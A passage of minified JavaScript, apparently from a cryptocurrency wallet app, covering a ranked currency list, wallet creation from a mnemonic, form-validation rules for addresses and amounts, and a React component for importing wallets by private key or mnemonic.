            id: "Polygon",
            ticker: "matic",
            family: "",
            contract: "",
            title: "Polygon",
            rank: 13
        }, {
            id: "Polkadot",
            ticker: "dot",
            family: "",
            contract: "",
            title: "Polkadot",
            rank: 14
        }, {
            id: "Litecoin",
            ticker: "ltc",
            family: "",
            contract: "",
            title: "Litecoin",
            rank: 15
        }, {
            id: "usdt:bsc:0x55d398326f99059ff775485246999027b3197955'",
            ticker: "usdt",
            family: "bsc",
            contract: "0x55d398326f99059ff775485246999027b3197955",
            title: "Tether",
            rank: 16
        }, {
            id: "busd:bsc:0xe9e7cea3dedca5984780bafc599bd69add087d56",
            ticker: "busd",
            family: "bsc",
            contract: "0xe9e7cea3dedca5984780bafc599bd69add087d56",
            title: "Binance USD",
            rank: 17
        }]
          , Uf = 10
          , createTop10CurrenciesCase_isCoin = e => "" === (null == e ? void 0 : e.family) && "" === (null == e ? void 0 : e.contract)
          , findWallet = (e, t) => t.find((t => t.currency === e))
          , defaultCreateTokenWallet = async (e, t, a) => {
            a && await a.addSubWallet({
                title: t.title,
                uuid: generateWalletUUID({
                    mnemonic: e,
                    address: a.address,
                    currency: t.ticker,
                    family: t.family
                }),
                address: a.address,
                currency: t.ticker,
                family: t.family,
                parentUuid: a.uuid,
                precision: t.decimals,
                smartContract: t.contract,
                privateKey: a.privateKey,
                balance: "0"
            })
        }
          , createCoinWallet = async (e, t) => {
            const a = e.ticker
              , n = Se.Z.getMetadata({
                ticker: a
            })
              , r = await Se.Z.getApiByCurrency(a)
              , l = _e.ZP.getClass({
                currency: a
            })
              , s = 0;
            let i = {};
            if (dd.includes(a.toLowerCase())) {
                const {privateKey: e, address: s, publicKey: o, legacyAddress: c, rewardAddress: u} = await r.getAddressFromMnemonic({
                    mnemonic: t,
                    accountIndex: 0
                })
                  , d = {
                    uuid: generateWalletUUID({
                        mnemonic: t,
                        address: s,
                        currency: a
                    }),
                    currency: a,
                    address: s,
                    privateKey: e,
                    publicKey: o,
                    legacyAddress: c,
                    title: `${(null == n ? void 0 : n.title) || a}${Number(0) ? " 0" : ""}`,
                    balance: "0",
                    subWallets: [],
                    derivedFromMnemonicUsing: {
                        accountIndex: 0
                    }
                };
                u && Object.assign(d, {
                    rewardAddress: u
                });
                i = (new l).recoverFromPlainObject(d)
            } else
                i = await (new l).create({
                    currency: a
                });
            return i
        }
          , Gf = Se.Z.getTickersByCoinAdapterFeatures((e => e.isActiveCreate && e.isActiveBulkCreate)).filter((e => e in Wf.coins))
          , createTopCurrencies = async e => {
            let {eventHandlers: t, mnemonic: a} = e;
            const n = []
              , r = Object.values(Mf).sort(( (e, t) => e.rank > t.rank ? 1 : -1))
              , l = 3;
            for (const e of r) {
                let r = 0;
                for (; r < 3; )
                    try {
                        if (!createTop10CurrenciesCase_isCoin(e)) {
                            const t = findWallet(e.family, n);
                            await defaultCreateTokenWallet(a, e, t);
                            break
                        }
                        {
                            var s;
                            null == t || null === (s = t.onStart) || void 0 === s || s.call(t, e);
                            const r = await createCoinWallet(e, a);
                            if (r) {
                                var i;
                                n.push(r);
                                null == t || null === (i = t.onFinish) || void 0 === i || i.call(t, e);
                                break
                            }
                        }
                    } catch (a) {
                        null != t && t.onError && (null == t || t.onError(e, a));
                        console.warn(a);
                        r++
                    }
            }
            return n
        }
        ;
        function *createTop10CurrenciesCase(e) {
            const {abortController: t, setCurrentCreatingTicker: a, setCreatedInfos: n, setMnemonic: r, password: l} = e.payload
              , s = Wf.generate();
            r && r(s);
            const {walletModels: i} = yield(0,
            Of.S3)({
                walletModels: (0,
                Of.RE)(createTopCurrencies, {
                    abortSignal: t.signal,
                    eventHandlers: {
                        onStart(e) {
                            a(e.ticker)
                        },
                        onFinish(e) {
                            n((t => t.concat([e])))
                        }
                    },
                    mnemonic: s
                }),
                cancel: (0,
                Of.qn)("@wallets.stopCreatingWallets")
            });
            if (i) {
                yield(0,
                Df.gz)(ie.setMasterPassword({
                    masterPassword: l
                }));
                yield(0,
                Of.xN)(bulkAddWallets(i.map((e => e.mapToPlainObject()))))
            }
            ge.b.success(ge.d.CREATE_WALLET_SUCCESS)
        }
        const Vf = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
          , Kf = /^[0-9a-fA-F]{66}$/
          , Hf = /^0x[a-fA-F0-9]{40}$/
          , zf = {
            email: [{
                rule: e => "" !== e && 0 !== e.length,
                message: "Email field cannot be empty"
            }, {
                rule: e => Vf.test(String(e).toLowerCase()),
                message: "Email is not valid"
            }],
            phoneNumber: [{
                rule: e => {
                    let {countryCode: t} = e;
                    return "" !== t && 0 !== t.length
                }
                ,
                message: "Country field cannot be empty"
            }, {
                rule: e => {
                    let {phone: t} = e;
                    return "" !== t && 0 !== t.length
                }
                ,
                message: "Phone field cannot be empty"
            }],
            publicKeyMultisig: [{
                rule: e => {
                    let {address: t} = e;
                    return String(t).length > 0
                }
                ,
                message: "Public key cannot be empty"
            }, {
                rule: e => {
                    let {address: t} = e;
                    return Kf.test(String(t).toLowerCase())
                }
                ,
                message: "Public key is not valid"
            }],
            addressMultisig: [{
                rule: e => {
                    let {address: t} = e;
                    return Boolean(t)
                }
                ,
                message: "Enter address"
            }, {
                rule: e => {
                    let {address: t} = e;
                    return Hf.test(String(t).toLowerCase())
                }
                ,
                message: "Address is invalid"
            }],
            minimumSigAmount: (e, t) => [{
                rule: e => t >= e,
                message: `Must be less than ${t}`
            }, {
                rule: a => t >= a && e <= a,
                message: "Must be equal or less than the number of participants"
            }],
            currency: [{
                rule: e => Boolean(e),
                message: "No currency selected"
            }],
            bool: [{
                rule: e => Boolean(e),
                message: "Required value"
            }],
            wallet: [{
                rule: e => Boolean(e),
                message: "No wallet selected"
            }],
            ethTokenListing: [{
                rule: e => "ERC20_TOKEN" === (null == e ? void 0 : e.type),
                message: "Please select a token"
            }],
            xtzValidator: [{
                rule: e => Boolean(e),
                message: "Please select validator"
            }],
            qtumValidator: [{
                rule: e => Boolean(e),
                message: "Please select validator"
            }],
            trxValidator: [{
                rule: e => Boolean(e),
                message: "Please select validator"
            }],
            walletTo: () => [{
                rule: e => Boolean(e),
                message: "No wallet selected"
            }],
            walletFrom: e => [{
                rule: t => Boolean(t) && Boolean(e),
                message: "No wallet selected"
            }, {
                rule: t => !(null != t && t.isWatchOnly || null != e && e.isWatchOnly),
                message: "Operation is not available for this wallet"
            }],
            country: [{
                rule: e => Boolean(e),
                message: "No country selected"
            }],
            password: [{
                rule: e => e.length > 0,
                message: "Password field cannot be empty"
            }],
            privateKey: [{
                rule: e => e.length > 0,
                message: "Private key cannot be empty"
            }, {
                rule: e => e.length > 10,
                message: "Private key is invalid"
            }],
            mnemonicPhrase: [{
                rule: e => e.length > 0,
                message: "Mnemonic phrase cannot be empty"
            }, {
                rule: e => 12 === e.trim().split(/\s+/).length,
                message: "Mnemonic phrase is invalid"
            }],
            passwordRepeat: e => [{
                rule: e => e.length > 0,
                message: "Password field cannot be empty"
            }, {
                rule: t => t === e,
                message: "Passwords do not match"
            }],
            address: [{
                rule: e => {
                    let {address: t} = e;
                    return Boolean(t)
                }
                ,
                message: "Enter address"
            }, {
                rule: e => {
                    let {isValidAddress: t} = e;
                    return t
                }
                ,
                message: "Address is invalid"
            }],
            selfAddress: [{
                rule: e => {
                    let {addressTo: t} = e;
                    return "" !== t && t.length > 0
                }
                ,
                message: "Enter the address"
            }, {
                rule: e => {
                    let {isSelfAddress: t} = e;
                    return !t
                }
                ,
                message: "Sending to yourself is prohibited"
            }, {
                rule: e => {
                    let {isValidAddress: t} = e;
                    return t
                }
                ,
                message: "Address is invalid"
            }],
            xrpAddress: [{
                rule: e => {
                    let {addressTo: t} = e;
                    return Boolean(t)
                }
                ,
                message: "Enter address"
            }, {
                rule: e => {
                    let {isValidAddress: t} = e;
                    return t
                }
                ,
                message: "This XRP account is invalid or has not been activated"
            }, {
                rule: e => {
                    let {isSelfAddress: t} = e;
                    return !t
                }
                ,
                message: "Address must not be the sending account"
            }],
            xrpDestinationTag: [{
                rule: e => {
                    let {destinationTag: t} = e;
                    return /^\d+$/.test(t)
                }
                ,
                message: "The Destination Tag must be integer number"
            }],
            decimals: [{
                rule: e => !Number.isNaN(parseInt(1 * e, 10)),
                message: "Decimals must be integer number"
            }, {
                rule: e => e < 255 && e >= 0,
                message: "Decimals value must be number in range from 0 to 255"
            }, {
                rule: e => Number(e) % 1 == 0,
                message: "Decimals value must be integer number"
            }],
            supply: [{
                rule: e => !Number.isNaN(parseInt(1 * e, 10)),
                message: "Supply must be integer number"
            }, {
                rule: e => e > 0,
                message: "Supply value must be a positive number"
            }, {
                rule: e => Number(e) % 1 == 0,
                message: "Supply value must be integer number"
            }],
            tokenTitle: [{
                rule: e => e.length > 0,
                message: "Title cannot be empty"
            }, {
                rule: e => e.length < 30,
                message: "No more than 30 symbols"
            }],
            tokenSymbol: [{
                rule: e => e.length > 2 && e.length < 6,
                message: "Use 3 to 5 symbols"
            }],
            accountName: e => [{
                rule: e => e.length > 0,
                message: "Account name cannot be empty"
            }, {
                rule: e => e.length > 2 && e.length < 40,
                message: "Account name is invalid"
            }, {
                rule: () => e,
                message: "Account name is not found"
            }],
            fioAddress: e => [{
                rule: e => e.length > 0,
                message: "Account name cannot be empty"
            }, {
                rule: e => e.length <= 51,
                message: "No more than 51 symbols"
            }, {
                rule: e => e.length >= 3,
                message: "No less than 3 symbols"
            }, {
                rule: e => /^(?:(?=.{3,64}$)[a-zA-Z0-9]{1}(?:(?!-{2,}))[a-zA-Z0-9-]*[a-zA-Z0-9]+@[a-zA-Z0-9]{1}(?:(?!-{2,}))[a-zA-Z0-9-]*[a-zA-Z0-9]+$)/.test(e),
                message: "Account name is invalid"
            }, {
                rule: () => e,
                message: "Account doesn't exist"
            }],
            fioMemo: [{
                rule: e => e.length <= 64,
                message: "Must be less than 64 characters"
            }],
            minimalFee: e => [{
                rule: t => (0,
                Ko.eg)(t, e.minimalFee),
                message: `The fee must be greater than ${e.minimalFee} ${e.currency.toUpperCase()} – set a higher fee per byte.`
            }],
            nonceValidation: () => [{
                rule: e => (0,
                Ko.eg)(e, 0),
                message: "Nonce must be 0 or greater than 0"
            }],
            extraId: e => [{
                rule: t => "xrp" !== (null == e ? void 0 : e.fromWalletCurrency) || "" === t || !isNaN(t) && !isNaN(parseInt(t, 10)),
                message: "Numeric only"
            }],
            amount: e => [{
                rule: t => {
                    if (void 0 === e.precision || null === e.precision || !t)
                        return !0;
                    const a = undefined;
                    return new (Sc())(t).decimalPlaces() <= e.precision
                }
                ,
                message: "0" === e.precision ? "Round up the amount. Only integers allowed." : `Reduce the number (max ${e.precision} decimals)`
            }, {
                rule: e => !(Number.isNaN(+e / 1) || !String(e).trim().length),
                message: "The value must be a number"
            }, {
                rule: t => !e.isAmountOutOfRange || (!(null !== e.min && !(0,
                Ko.G)(e.min, 0)) || (0,
                Ko.eg)(t, e.min)),
                message: `Must be greater than ${e.min} ${e.currency ? e.currency.toUpperCase() : ""}`
            }, {
                rule: t => null === e.available || void 0 === e.available || (0,
                Ko.G)(t, e.available),
                message: e.isFullErrorMessage ? "Insufficient funds for the transaction" : "Insufficient funds"
            }, {
                rule: t => !(null !== e.min && !(0,
                Ko.G)(e.min, 0)) || (0,
                Ko.eg)(t, e.min),
                message: `Must be greater than ${e.min} ${e.currency ? e.currency.toUpperCase() : ""}`
            }, {
                rule: t => !(null !== e.max && !(0,
                Ko.G)(e.max, 0)) || (0,
                Ko.G)(t, e.max),
                message: `Must be less than ${e.max}`
            }, {
                rule: t => !e.isInt || Number.isInteger(+t),
                message: "The value must be an integer."
            }, {
                rule: t => !!e.isSendToken || (!e.fee || Number.isNaN(e.fee) || (0,
                Ko.eg)((0,
                Ko.h9)(t, e.fee), 0)),
                message: "Insufficient funds for gas * price + value"
            }, {
                rule: () => {
                    var t;
                    return !e.isSendToken || (!e.fee || Number.isNaN(e.fee) || !(null != e && e.feeWallet) || (0,
                    Ko.gt)(null === (t = e.feeWallet) || void 0 === t ? void 0 : t.balance, e.fee))
                }
                ,
                message: ( (e, t) => {
                    if (!e && !t)
                        return "";
                    const a = `${e.address.slice(2, 6)}...${e.address.slice(-4)}`
                      , n = undefined;
                    return `You need to have at least ${t}${null == e ? void 0 : e.currency.toUpperCase()} on ${a} to cover network fees.`
                }
                )(e.feeWallet, e.fee)
            }, {
                rule: e => e > 0,
                message: "The value must be greater than 0"
            }],
            amountAndBalance: e => {
                let {balance: t, amountValidateObject: a, amount: n} = e;
                return [{
                    rule: () => {
                        if (null === (null == a ? void 0 : a.min))
                            return !0;
                        const e = undefined;
                        if ((0,
                        Ko.eg)(n, t) && (0,
                        Ko.eg)(n, null == a ? void 0 : a.min))
                            return !1;
                        const r = zf.amount(a).every((e => e.rule(Number(n))))
                          , l = (0,
                        Ko.eg)(t, n);
                        return r && l
                    }
                    ,
                    message: ( () => {
                        if (null === (null == a ? void 0 : a.min) || isNaN(null == a ? void 0 : a.min))
                            return "";
                        const e = undefined;
                        if ((0,
                        Ko.eg)(n, t) && (0,
                        Ko.eg)(n, null == a ? void 0 : a.min))
                            return null != a && a.isFullErrorMessage ? "Insufficient funds for the transaction" : "Insufficient funds";
                        const r = undefined;
                        if (!(0 !== Number(t) && (0,
                        Ko.eg)(t, n)))
                            return `Must be greater than ${(null == a ? void 0 : a.min) || t || 0}`;
                        const l = zf.amount(a).reduce(( (e, t) => t.rule(Number(n)) ? e : {
                            status: !1,
                            message: t.message
                        }), {
                            status: !0,
                            message: ""
                        });
                        return null != l && l.status ? "" : l.message
                    }
                    )()
                }]
            }
            ,
            zilStakingAmount: e => [{
                rule: t => !(null !== e.min && !(0,
                Ko.G)(e.min, 0)) || (0,
                Ko.eg)(t, e.min),
                message: `Should be greater than ${e.min} ZIL`
            }, {
                rule: t => null === e.available || void 0 === e.available || (0,
                Ko.G)(t, e.available),
                message: "Insufficient funds"
            }, {
                rule: t => {
                    if (void 0 === e.precision || null === e.precision)
                        return !0;
                    const a = undefined;
                    return new (Sc())(t).decimalPlaces() <= e.precision
                }
                ,
                message: `Reduce the number (max ${e.precision} decimals)`
            }, {
                rule: t => void 0 === e.max || null === e.max || (!!(0,
                Ko.eq)((0,
                Ko.h9)(e.max, t), "0") || (0,
                Ko.eg)((0,
                Ko.h9)(e.max, t), "10")),
                message: "You must leave at least 10 ZIL staked or withdraw the full amount."
            }],
            nowUnstakingAmount: e => [{
                rule: t => void 0 === e.max || null === e.max || (!!(0,
                Ko.eq)((0,
                Ko.h9)(e.max, t), "0") || (0,
                Ko.eg)((0,
                Ko.h9)(e.max, t), "10")),
                message: "You must leave at least 10 NOW staked or withdraw the full amount."
            }],
            trxMinimumAmount: e => [{
                rule: t => !(null !== e.min && !(0,
                Ko.G)(e.min, 0)) || (0,
                Ko.eg)(t, e.min),
                message: `The minimum for this validator is ${e.min} TRX`
            }],
            trxLockPeriod: e => [{
                rule: t => null === e.min || e.min < 0 || (!e.lock || t >= e.min),
                message: `Min lock period is ${e.min} days`
            }, {
                rule: t => null === e.max || e.max < 0 || (!e.lock || t <= e.max),
                message: `Max lock period is ${e.max} days`
            }],
            ethMinimumAmount: e => [{
                rule: t => !(null !== e.min && !(0,
                Ko.G)(e.min, 0)) || (0,
                Ko.eg)(t, e.min),
                message: `Should be greater than ${e.min} ETH`
            }],
            bchSplitAmount: e => [{
                rule: t => (0,
                Ko.eg)(null == t ? void 0 : t.balance, e.min),
                message: "Insufficient funds"
            }],
            dotMinimalBalance: e => {
                if (!e.fromWallet || "dot" !== e.fromWallet.currency)
                    return [];
                const t = e.balance;
                return [{
                    rule: e => !(null === t || !(0,
                    Ko.eg)(t, 1)) || (0,
                    Ko.eg)(e, 1),
                    message: "Should be greater than 1"
                }]
            }
            ,
            adaMinimalBalanceAndAmount: e => {
                if (!e.fromWallet || "ada" !== e.fromWallet.currency)
                    return [];
                const t = e.fromWallet.balance;
                return [{
                    rule: e => (0,
                    Ko.eg)(e, 1),
                    message: "Must be greater than 1 (by the ADA rules)"
                }, {
                    rule(e) {
                        const a = (0,
                        Ko.h9)(t, e);
                        return (0,
                        Ko.eg)(a, 1) || (0,
                        Ko.G)(a, 0)
                    },
                    message: "ADA network rules: send all or leave at least 1 ADA on balance."
                }]
            }
            ,
            nearMinimalBalance: e => [{
                rule: t => !(e.fromWallet && "near" === e.fromWallet.currency && null !== e.balance && !(0,
                Ko.gt)(e.balance, 0)) || !!(0,
                Ko.eq)(e.balance, 0) && (0,
                Ko.eg)(t, .02),
                message: "Should be greater than 0.02 NEAR"
            }],
            haveFee: e => [{
                rule: t => !(null == t || !e),
                message: "Please wait for the Network fee to load"
            }],
            haveFeePerByte: () => [{
                rule: Boolean,
                message: "Please wait for the Network fee to load"
            }],
            isOnline: () => [{
                rule: Boolean,
                message: "Network error. Please check your Internet connection"
            }]
        }
          , jf = {
            containerWrapper: "import-block_containerWrapper_1h8jf",
            secureNoteWrapper: "import-block_secureNoteWrapper_1Vc8k",
            wrapperAddButton: "import-block_wrapperAddButton_3GNAb",
            wrapperQrScanner: "import-block_wrapperQrScanner_3o6SJ",
            tooltipRed: "import-block_tooltipRed_1yHDg",
            themeWhite: "import-block_themeWhite_3LSZn",
            inputPrivateKey: "import-block_inputPrivateKey_WAsC7",
            buttonImport: "import-block_buttonImport_ZsUK4",
            showPassIconBlue: "import-block_showPassIconBlue_1t2TW",
            hidePassIconBlue: "import-block_hidePassIconBlue_xp_6E",
            icon: "import-block_icon_3SNdG",
            rightIcon: "import-block_rightIcon_3vBR0",
            leftIcon: "import-block_leftIcon_3euMp",
            advencedTop: "import-block_advencedTop_1lkom",
            advencedBtn: "import-block_advencedBtn_1e5qS",
            white: "import-block_white_1N7Mr",
            advencedSearchBtn: "import-block_advencedSearchBtn_cS2YF",
            tabList: "import-block_tabList_3-Jx8",
            derivationType: "import-block_derivationType_2dDXg",
            derivationTypeList: "import-block_derivationTypeList_1BM1L",
            tabItem: "import-block_tabItem_1d3BS",
            tabActive: "import-block_tabActive_-ZiGs",
            derivationTypeAccount: "import-block_derivationTypeAccount_2_Sv9",
            derivationTypeText: "import-block_derivationTypeText_3mr3w",
            derivationTypeInput: "import-block_derivationTypeInput_8hCkf",
            foundAccount: "import-block_foundAccount_2XSxy",
            foundAccountBalance: "import-block_foundAccountBalance_R6mZs",
            foundAccountTitle: "import-block_foundAccountTitle_HGwsI",
            advencedSearchBtnDer: "import-block_advencedSearchBtnDer_1qdA9",
            foundAccountAddress: "import-block_foundAccountAddress_npcdJ",
            dark: "import-block_dark_Pqur2",
            light: "import-block_light_1UJVz",
            blueColor: "import-block_blueColor_3Pjbr"
        }
          , isMnemonic = e => {
            const t = undefined
              , a = e.trim().split(/\s+/).length;
            return 12 === a || 24 === a || 25 === a
        }
          , getPlaceholderPrivateKey = (e, t) => t ? "Mnemonic" : "xmr" === e ? "View key or Mnemonic" : "trx" === e || "ada" === e ? "Private key or Mnemonic" : ["eth", "etc", "clo", "exp", "joys", "ubq"].includes(null != e ? e : "") ? "Private Key, Mnemonic, or JSON" : "Private key, Mnemonic, WIF or XPRV"
          , getPlaceholderPassword = e => "xmr" === e ? "Spend Key" : "Password"
          , import_block_isMnemonicPrivateKey = e => e.split(" ").length > 5
          , getInputType = e => e ? "text" : "password"
          , $f = ["ada-shelley", "btc"]
          , ImportBlock = e => {
            var t;
            const a = (0,
            $.v9)($c)
              , n = (0,
            $.I0)()
              , [r,l] = (0,
            O.useState)()
              , [s,i] = (0,
            O.useState)("")
              , [o,c] = (0,
            O.useState)("")
              , [u,d] = (0,
            O.useState)("")
              , [m,p] = (0,
            O.useState)()
              , [f,E] = (0,
            O.useState)(!1)
              , [h,g] = (0,
            O.useState)(!1)
              , [y,v] = (0,
            O.useState)(!1)
              , [_,w] = (0,
            O.useState)(!1)
              , [b,k] = (0,
            O.useState)(null);
            let S;
            const C = O.createRef()
              , [N,T] = (0,
            O.useState)(!1)
              , [A,x] = (0,
            O.useState)(!1)
              , I = (0,
            $.v9)(Ot)
              , [P,L] = (0,
            O.useState)(null)
              , isJsonPrivateKey = e => {
                if (!e || -1 === e.indexOf("{"))
                    return !1;
                try {
                    JSON.parse(e);
                    return e.length > 10
                } catch (e) {
                    return !1
                }
            }
              , F = (0,
            O.useCallback)(( () => {
                const e = isJsonPrivateKey(s);
                return "xmr" === r ? !import_block_isMnemonicPrivateKey(s) : e
            }
            ), [r, s]);
            (0,
            O.useEffect)(( () => {
                E(F());
                w(!1);
                k(null);
                return () => window.clearTimeout(S)
            }
            ), [F, r, S, s]);
            const handleChangeCurrency = e => {
                l(e.ticker);
                p(e)
            }
            ;
            (0,
            O.useEffect)(( () => {
                e.currency && handleChangeCurrency({
                    ticker: e.currency
                })
            }
            ), [e.currency]);
            const handleChangePrivateKey = (e, t) => {
                let {target: {value: a}} = e;
                i(a);
                t && t()
            }
              , showError = e => {
                g(!1);
                i("");
                c("");
                d("");
                v(e);
                window.clearTimeout(S);
                S = window.setTimeout(( () => v(!1)), 2e3)
            }
              , handleAddWallet = async () => {
                var t, n;
                if (h || !r)
                    return;
                w(!1);
                const {isValid: l} = null !== (t = null === (n = C.current) || void 0 === n ? void 0 : n.validate()) && void 0 !== t ? t : {};
                if (!l) {
                    w(!0);
                    return
                }
                g(!0);
                let m = s;
                o && "xmr" === r && (import_block_isMnemonicPrivateKey(s) || (m = {
                    viewKey: s,
                    spendKey: o
                }));
                const f = {
                    currency: r,
                    privateKey: m,
                    password: o,
                    forceAddress: u,
                    isImport: !0
                };
                if (null !== P) {
                    f.accountIndex = P.accountIndex,
                    f.mnemonic = P.mnemonic;
                    f.derivationType = P.type
                }
                try {
                    const t = _e.ZP.getClass({
                        currency: f.currency
                    })
                      , n = await (new t).create(f);
                    g(!1);
                    const l = a.find((e => (0,
                    Ho.t)(e.address) === (0,
                    Ho.t)(n.address) && e.currency === r))
                      , s = !!l && l.isWatchOnly;
                    if (l && !s) {
                        showError("This wallet is already imported!");
                        return
                    }
                    var E;
                    null === (E = e.onImportWallets) || void 0 === E || E.call(e, n, s ? l : void 0)
                } catch (e) {
                    if (e.code) {
                        g(!1);
                        k(e);
                        return
                    }
                    showError("Private key is invalid!");
                    return
                }
                X("0");
                i("");
                c("");
                d("");
                x(!1);
                T(!1);
                p(void 0);
                L(null)
            }
              , handleAddWalletsByMnemonic = async () => {
                var t, a;
                if (h)
                    return;
                w(!1);
                const {isValid: r} = null !== (t = null === (a = C.current) || void 0 === a ? void 0 : a.validate()) && void 0 !== t ? t : {};
                if (!r) {
                    w(!0);
                    return
                }
                i("");
                g(!0);
                const l = new AbortController
                  , {signal: o} = l
                  , u = await createTopCurrencies({
                    abortSignal: o,
                    mnemonic: s
                });
                n(rd.setWalletsMnemonic(s));
                c("");
                d("");
                x(!1);
                T(!1);
                "function" == typeof e.onImportWalletsByMnemonic && e.onImportWalletsByMnemonic(u)
            }
              , handleScanPrivateKey = t => {
                i(t);
                e.isMnemonicImport && handleAddWalletsByMnemonic();
                r && handleAddWallet()
            }
              , W = (0,
            O.useRef)(null)
              , R = (0,
            O.useMemo)((async () => {
                const e = await Se.Z.getApiByCurrency(r);
                if (W.current) {
                    var t;
                    await (null === (t = W.current) || void 0 === t ? void 0 : t.getAccountFromMnemonicAndAddressDestructor())
                }
                W.current = e;
                return e
            }
            ), [r]);
            (0,
            O.useEffect)(( () => () => {
                R.then((e => {
                    null == e || e.getAccountFromMnemonicAndAddressDestructor()
                }
                ))
            }
            ), []);
            const [B] = (0,
            O.useState)(12e4)
              , [D] = (0,
            O.useState)()
              , [M,U] = (0,
            O.useState)(null)
              , [G,V] = (0,
            O.useState)(null)
              , [K,H] = (0,
            O.useState)(!1);
            (0,
            O.useEffect)(( () => {
                H(!1);
                g(!1);
                U(null);
                L(null);
                V(null);
                d("");
                R.then((e => {
                    null == e || e.getAccountFromMnemonicAndAddressDestructor()
                }
                ))
            }
            ), [r]);
            const handleSearchAddress = async () => {
                try {
                    g(!0);
                    U(null);
                    V(null);
                    L(null);
                    const n = await R;
                    if (null === n || void 0 === (null == n ? void 0 : n.getAccountFromMnemonicAndAddress))
                        throw "Something went wrong";
                    const r = await n.getAccountFromMnemonicAndAddress({
                        mnemonic: s,
                        address: u,
                        maxTimeInMS: B,
                        index: D
                    });
                    if (r instanceof Error || (null == r ? void 0 : r.error)instanceof Error) {
                        var e, t, a;
                        throw null !== (e = null !== (t = null == r || null === (a = r.error) || void 0 === a ? void 0 : a.message) && void 0 !== t ? t : r.message) && void 0 !== e ? e : "Something went wrong"
                    }
                    if (null === r)
                        throw "Wallet not found";
                    await L({
                        mnemonic: s,
                        address: r.account.address,
                        accountIndex: r.accountIndex
                    });
                    V("Wallet found successfully. Click add wallet.")
                } catch (e) {
                    U(e)
                } finally {
                    g(!1)
                }
                return null
            }
              , [z,j] = (0,
            O.useState)("derivation_path")
              , [Z,Y] = (0,
            O.useState)(to.L.LEGACY)
              , [q,X] = (0,
            O.useState)("0")
              , [Q,J] = (0,
            O.useState)("")
              , [ee,te] = (0,
            O.useState)(null)
              , handleAdvencedClick = () => {
                H((e => !e));
                g(!1);
                U(null);
                L(null);
                V(null);
                j("derivation_path");
                Y(to.L.LEGACY);
                X("0");
                J("");
                getDerivePath().then((e => te(e)));
                R.then((e => {
                    null == e || e.getAccountFromMnemonicAndAddressDestructor()
                }
                ))
            }
            ;
            (0,
            O.useEffect)(( () => {
                var e, t;
                const a = document.querySelector("#parent-popup")
                  , n = null == a ? void 0 : a.clientHeight
                  , r = null === (e = window) || void 0 === e || null === (t = e.screen) || void 0 === t ? void 0 : t.height;
                if (a && n && r)
                    if (K && a instanceof HTMLElement) {
                        a.style.marginBottom = "25px";
                        a.style.marginTop = "20px"
                    } else if (a instanceof HTMLElement) {
                        a.style.marginBottom = "";
                        a.style.marginTop = ""
                    }
            }
            ), [K]);
            const getDerivePath = async () => {
                try {
                    const e = await R
                      , t = await e.getCoinTypeBIP44();
                    switch (Z) {
                    case to.L.LEGACY:
                        return `m/0'/0/${q}`;
                    case to.L.BIP44:
                        return `m/44'/${t}'/${q}'/0/0`;
                    case to.L.BIP49:
                        return `m/49'/${t}'/${q}'/0/0`;
                    case to.L.BIP84:
                        return `m/84'/${t}'/${q}'/0/0`;
                    default:
                        return await e.getDerivePath()
                    }
                } catch {
                    return ""
                }
            }
            ;
            (0,
            O.useEffect)(( () => {
                getDerivePath().then((e => te(e)))
            }
            ), [R, q, Z]);
            const handleUpdateAccountIndex = e => {
                ("" === e || /^[0-9]*$/.test(e)) && X("" === e ? "0" : String(parseInt(e, 10)))
            }
              , handleFindWalletByDerivation = async () => {
                J("");
                L(null);
                if (q.length)
                    if (s.length)
                        if (s.length && isMnemonic(s)) {
                            g(!0);
                            L(null);
                            try {
                                var e;
                                const t = await R;
                                if (!t || null == t || !t.getAddressFromMnemonic || null == t || !t.getBalanceByAddress)
                                    throw "Something went wrong";
                                const a = await t.getAddressFromMnemonic({
                                    mnemonic: s,
                                    accountIndex: q,
                                    type: Z
                                })
                                  , n = await Se.Z.loadLightAdapterByWallet({
                                    currency: "btc"
                                });
                                if (!n)
                                    throw "Something went wrong";
                                const r = await n.getBalanceByAddress({
                                    address: a.address
                                })
                                  , {balance: l} = (0,
                                Ae.k)(r);
                                L({
                                    balance: l,
                                    address: a.address,
                                    mnemonic: s,
                                    accountIndex: null !== (e = +q) && void 0 !== e ? e : 0,
                                    type: Z
                                })
                            } catch (e) {
                                J("Something went wrong")
                            } finally {
                                g(!1)
                            }
                        } else
                            J("Only mnemonic are supported");
                    else
                        J("Mnemonic cannot be empty");
                else
                    J("Account cannot be empty")
            }
              , ae = (0,
            O.useMemo)(( () => "blue" === e.bgColor ? jf.blueColor : null), [e.bgColor])
              , ne = (0,
            O.useMemo)(( () => "dark" === I ? jf.dark : null), [I])
              , re = (0,
            O.useMemo)(( () => "light" === I ? jf.light : null), [I])
              , le = ae || ne || re;
            return O.createElement("div", {
                className: Ht()(jf.containerWrapper, {
                    [jf.themeWhite]: "light" === I && "blue" === e.bgColor
                })
            }, O.createElement(_m, {
                currency: r,
                type: am,
                isColorInverted: "light" === I
            }), O.createElement(sf(), {
                ref: C
            }, !e.isMnemonicImport && O.createElement(lf.ValidatorField, {
                rules: zf.currency,
                value: m || ""
            }, (t => {
                var a;
                let {isValid: n, message: r} = t;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !n && _,
                    message: r
                }, O.createElement(Vd, {
                    onChange: handleChangeCurrency,
                    currencies: Se.Z.getTickersByCoinAdapterFeatures((e => e.isActiveImport)),
                    selectedCurrency: null !== (a = e.currency ? (0,
                    be.II)(e.currency) : m) && void 0 !== a ? a : void 0
                }))
            }
            )), O.createElement("div", {
                className: "relative"
            }, O.createElement(tooltip, {
                text: y || "",
                visible: !!y,
                className: jf.tooltipRed
            }), O.createElement(lf.ValidatorField, {
                rules: e.isMnemonicImport ? zf.mnemonicPhrase : zf.privateKey,
                value: s
            }, (t => {
                let {isValid: a, message: n} = t;
                return O.createElement(pa, {
                    isInvalid: !a && _,
                    message: n
                }, O.createElement(Ea, {
                    value: s,
                    onChange: handleChangePrivateKey,
                    autoComplete: "new-password",
                    onEnter: handleAddWallet,
                    placeholder: getPlaceholderPrivateKey(r, e.isMnemonicImport || K),
                    className: Ht()(jf.inputPrivateKey),
                    type: getInputType(N)
                }))
            }
            )), !s && O.createElement(qr_scanner_paste_button, {
                setAddress: handleScanPrivateKey,
                className: Ht()(jf.rightIcon)
            }), O.createElement("span", {
                onClick: () => T((e => !e)),
